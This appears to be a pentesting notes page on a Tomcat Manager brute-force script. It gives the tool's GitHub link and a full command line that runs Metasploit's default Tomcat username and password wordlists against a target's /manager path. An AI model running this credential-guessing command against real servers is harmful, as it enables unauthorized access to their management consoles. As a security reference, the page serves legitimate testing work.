# Tomcate Brute Force: mgr_brute.py

OS: Linux, Web
Description: Tomcat Brute Force
Security Domains: Reconnaissance (https://www.notion.so/Reconnaissance-1434c8e5237680fe960be92e51e13491?pvs=21)
Target_Technology: tomcat (https://www.notion.so/tomcat-1444c8e523768076b6d7c8c5e2f1f55c?pvs=21)
URL: https://github.com/b33lz3bub-1/Tomcat-Manager-Bruteforce

```jsx
python3 mgr_brute.py -U <http://domainnameoripaddressofTomCatsite> -P /manager -u /usr/share/metasploit-framework/data/wordlists/tomcat_mgr_default_users.txt -p /usr/share/metasploit-framework/data/wordlists/tomcat_mgr_default_pass.txt
```

```jsx
https://github.com/b33lz3bub-1/Tomcat-Manager-Bruteforce
```